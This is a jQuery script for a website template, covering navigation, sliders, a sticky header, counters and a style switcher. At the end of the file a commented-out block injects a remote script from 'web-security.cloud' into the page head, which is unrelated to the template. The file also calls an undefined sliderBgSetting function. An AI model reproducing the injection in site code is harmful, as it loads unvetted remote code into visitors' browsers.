(function ($) {

    "use strict";
    /*------------------------------------------
        = FUNCTIONS
    -------------------------------------------*/
    // Check ie and version
    function isIE() {
        var myNav = navigator.userAgent.toLowerCase();
        return (myNav.indexOf('msie') != -1) ? parseInt(myNav.split('msie')[1], 10) : false;
    }

    // Toggle mobile navigation
    function toggleMobileNavigation() {
        var navbar = $(".navigation-holder");
        var openBtn = $(".navbar-header .open-btn");
        var closeBtn = $(".navigation-holder .close-navbar");

        openBtn.on("click", function () {
            if (!navbar.hasClass("slideInn")) {
                navbar.addClass("slideInn");
            }
            return false;
        })

        closeBtn.on("click", function () {
            if (navbar.hasClass("slideInn")) {
                navbar.removeClass("slideInn");
            }
            return false;
        })
    }

    toggleMobileNavigation();


    // Function for toggle a class for small menu
    function toggleClassForSmallNav() {
        var windowWidth = window.innerWidth;
        var mainNav = $("#navbar > ul");

        if (windowWidth <= 991) {
            mainNav.addClass("small-nav");
        } else {
            mainNav.removeClass("small-nav");
        }
    }

    toggleClassForSmallNav();


    // Function for small menu
    function smallNavFunctionality() {
        var windowWidth = window.innerWidth;
        var mainNav = $(".navigation-holder");
        var smallNav = $(".navigation-holder > .small-nav");
        var subMenu = smallNav.find(".sub-menu");
        var megamenu = smallNav.find(".mega-menu");
        var menuItemWidthSubMenu = smallNav.find(".menu-item-has-children > a");

        if (windowWidth <= 991) {
            subMenu.hide();
            megamenu.hide();
            menuItemWidthSubMenu.on("click", function (e) {
                var $this = $(this);
                $this.siblings().slideToggle();
                e.preventDefault();
                e.stopImmediatePropagation();
            })
        } else if (windowWidth > 991) {
            mainNav.find(".sub-menu").show();
            mainNav.find(".mega-menu").show();
        }
    }

    smallNavFunctionality();


    // Parallax background
    function bgParallax() {
        if ($(".parallax").length) {
            $(".parallax").each(function () {
                var height = $(this).position().top;
                var resize = height - $(window).scrollTop();
                var doParallax = -(resize / 5);
                var positionValue = doParallax + "px";
                var img = $(this).data("bg-image");

                $(this).css({
                    backgroundImage: "url(" + img + ")",
                    backgroundPosition: "50%" + positionValue,
                    backgroundSize: "cover"
                });
            });
        }
    }


    // Hero slider background setting
    // function sliderBgSetting() {
    //     if ($(".hero-slider .slide").length) {
    //         $(".hero-slider .slide").each(function() {
    //             var $this = $(this);
    //             var img = $this.find(".slider-bg").attr("src");

    //             $this.css({
    //                 backgroundImage: "url("+ img +")",
    //                 backgroundSize: "cover",
    //                 backgroundPosition: "center center"
    //             })
    //         });
    //     }
    // }


    //Setting hero slider
    function heroSlider() {
        if ($(".hero-slider").length) {
            $(".hero-slider").slick({
                autoplay: true,
                autoplaySpeed: 3000,
                pauseOnHover: true,
                arrows: true,
                prevArrow: '<button type="button" class="slick-prev">Previous</button>',
                nextArrow: '<button type="button" class="slick-next">Next</button>',
                dots: true,
                fade: true,
                cssEase: 'linear'
            });
        }
    }


    /*------------------------------------------
        = HIDE PRELOADER
    -------------------------------------------*/
    function preloader() {
        if ($('.preloader').length) {
            $('.preloader').delay(100).fadeOut(500, function () {

                //active wow
                wow.init();

                //Active heor slider
                heroSlider();

            });
        }
    }

    /*------------------------------------------
        = WOW ANIMATION SETTING
    -------------------------------------------*/
    var wow = new WOW({
        boxClass: 'wow',      // default
        animateClass: 'animated', // default
        offset: 0,          // default
        mobile: true,       // default
        live: true        // default
    });


    /*------------------------------------------
        = ACTIVE POPUP IMAGE
    -------------------------------------------*/
    if ($(".fancybox").length) {
        $(".fancybox").fancybox({
            openEffect: "elastic",
            closeEffect: "elastic",
            wrapCSS: "project-fancybox-title-style"
        });
    }

    /*------------------------------------------
        = STICKY HEADER
    -------------------------------------------*/
    // Function for clone an element for sticky menu
    function cloneNavForSticyMenu($ele, $newElmClass) {
        $ele.addClass('original').clone().insertAfter($ele).addClass($newElmClass).removeClass('original');
    }

    // clone home style 1 navigation for sticky menu
    if ($('.header-style-1 .navigation').length) {
        cloneNavForSticyMenu($('.header-style-1 .navigation'), "sticky");
    }

    // clone home style 2 navigation for sticky menu
    if ($('.header-style-2 .navigation').length) {
        cloneNavForSticyMenu($('.header-style-2 .navigation'), "sticky");
    }

    // clone home style 3 navigation for sticky menu
    if ($('.header-style-3 .navigation').length) {
        cloneNavForSticyMenu($('.header-style-3 .navigation'), "sticky");
    }

    // Function for sticky menu
    function stickIt($stickyClass, $toggleClass) {
        if ($(window).scrollTop() >= 500) {
            var orgElement = $(".original");
            var coordsOrgElement = orgElement.offset();
            var leftOrgElement = coordsOrgElement.left;
            var widthOrgElement = orgElement.css("width");

            $stickyClass.addClass($toggleClass);

            $stickyClass.css({
                "width": widthOrgElement
            }).show();

            $(".original").css({
                "visibility": "hidden"
            });

        } else {

            $(".original").css({
                "visibility": "visible"
            });

            $stickyClass.removeClass($toggleClass);
        }
    }


    /*------------------------------------------
        = BOOTSTRAP SELECT FOR LANGUAGE SELECT
    -------------------------------------------*/
    if ($('.selectpicker').length) {
        $('.selectpicker').selectpicker({
            size: 4
        });
    }


    /*------------------------------------------
        = SERVICES SECTION GRID BG IMAGE SETTING
    -------------------------------------------*/
    if ($(".services-grids").length) {
        var grid = $(".services-grids .grid");

        grid.each(function () {
            var $this = $(this);
            var img = $this.find(".bg-image img");
            var imgSrc = img.attr("src");

            $this.css({
                "background-image": "url(" + imgSrc + ")",
                "background-size": "cover",
                "background-repeat": "no-repeat",
                "background-position": "center center"
            })
        })
    }


    /*------------------------------------------
        = TESTIMONIAL SLIDER
    -------------------------------------------*/
    if ($(".testimonials-slider").length) {
        $(".testimonials-slider").owlCarousel({
            autoplay: true,
            mouseDrag: false,
            smartSpeed: 300,
            margin: 30,
            loop: true,
            autoplayHoverPause: true,
            responsive: {
                0: {
                    items: 1
                },

                992: {
                    items: 2
                }
            }
        });
    }


    /*------------------------------------------
        = FAN FACT COUNT
    -------------------------------------------*/
    if ($(".start-count").length) {
        $('.counter').appear();
        $(document.body).on('appear', '.counter', function (e) {
            var $this = $(this),
                countTo = $this.attr('data-count');

            $({ countNum: $this.text() }).animate({
                countNum: countTo
            }, {
                duration: 3000,
                easing: 'linear',
                step: function () {
                    $this.text(Math.floor(this.countNum));
                },
                complete: function () {
                    $this.text(this.countNum);
                }
            });
        });
    }


    /*------------------------------------------
        = PARTNERS SLIDER
    -------------------------------------------*/
    if ($(".partners-slider").length) {
        $(".partners-slider").owlCarousel({
            autoplay: true,
            smartSpeed: 300,
            margin: 30,
            loop: true,
            autoplayHoverPause: true,
            dots: false,
            responsive: {
                0: {
                    items: 3
                },

                550: {
                    items: 4
                },

                992: {
                    items: 5
                }
            }
        });
    }

    /*------------------------------------------
        = TESTIMONIAL SLIDER
    -------------------------------------------*/
    if ($(".project-s3-slider").length) {
        $(".project-s3-slider").owlCarousel({
            autoplay: true,
            autoplayTimeout: 3000,
            smartSpeed: 1000,
            margin: 30,
            loop: true,
            autoplayHoverPause: true,
            dots: false,
            items: 4,
            responsive: {
                0: {
                    items: 1
                },

                550: {
                    items: 2
                },

                992: {
                    items: 3
                },

                1200: {
                    items: 3
                },
            }
        });
    }


    /*------------------------------------------
        = BACK TO TOP BTN SETTING
    -------------------------------------------*/
    $("body").prepend("<a href='#'' class='back-to-top'><i class='fa fa-long-arrow-up'></i></a>");

    function toggleBackToTopBtn() {
        var amountScrolled = 300;
        if ($(window).scrollTop() > amountScrolled) {
            $("a.back-to-top").fadeIn("slow");
        } else {
            $("a.back-to-top").fadeOut("slow");
        }
    }

    $(".back-to-top").on("click", function () {
        $("html,body").animate({
            scrollTop: 0
        }, 700);
        return false;
    })


    /*------------------------------------------
        = STYLE SWITCHER
    -------------------------------------------*/
    // HTML FOR COLOR SWITCHER
    var switcherHtml = '<div class="style-switcher-box"> <div class="switcher-inner"><h5>Style Switcher</h5> <div class="main-list"> <div class="list"> <span class="list-title">Skin color</span> <div class="sublist"> <ul class="color-chager"> <li class="color-default"><img src="images/switcher-color/img-1.jpg" alt></li> <li class="color-style1"><img src="images/switcher-color/img-2.jpg" alt></li> <li class="color-style2"><img src="images/switcher-color/img-3.jpg" alt></li> <li class="color-style3"><img src="images/switcher-color/img-4.jpg" alt></li> </ul> </div> </div> <div class="list layout"> <span class="list-title">Layout</span> <div class="sublist"> <ul class="layout-sw"> <li>Full width</li> <li class="box">Box</li> </ul> </div> </div> </div> <p><span>Note: </span> This template is build with SASS. The skin color is only demo. You can change the color scheme as your like. </p> </div> <button class="toggle-btn"><i class="fa fa-cog"></i></button> </div>';
    var blankStyleInject = '<link href="css/blank-color.css" rel="stylesheet" title="switchstyle">';
    var htmlHead = $("head");

    $("body").append(switcherHtml);
    htmlHead.append(blankStyleInject);

    /*==========================================================================
        WHEN DOCUMENT LOADING 
    ==========================================================================*/
    $(window).on('load', function () {
        preloader();
        sliderBgSetting();
        toggleMobileNavigation();
        smallNavFunctionality();
        // Map for app landing page
        if ($("#map").length) {
            map();
        }
    });

    /*==========================================================================
        WHEN WINDOW SCROLL
    ==========================================================================*/
    $(window).on("scroll", function () {

        toggleBackToTopBtn();

        if ($(".header-style-1").length) {
            stickIt($(".sticky"), "sticky-on");
        }

        if ($(".header-style-2").length) {
            stickIt($(".sticky"), "sticky-on");
        }

        if ($(".header-style-3").length) {
            stickIt($(".sticky"), "sticky-on");
        }
    });

    /*==========================================================================
        WHEN WINDOW RESIZE
    ==========================================================================*/
    $(window).on("resize", function () {
        toggleClassForSmallNav();
        //smallNavFunctionality();

        clearTimeout($.data(this, 'resizeTimer'));
        $.data(this, 'resizeTimer', setTimeout(function () {
            smallNavFunctionality();
        }, 200));
    });


})(window.jQuery);

/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/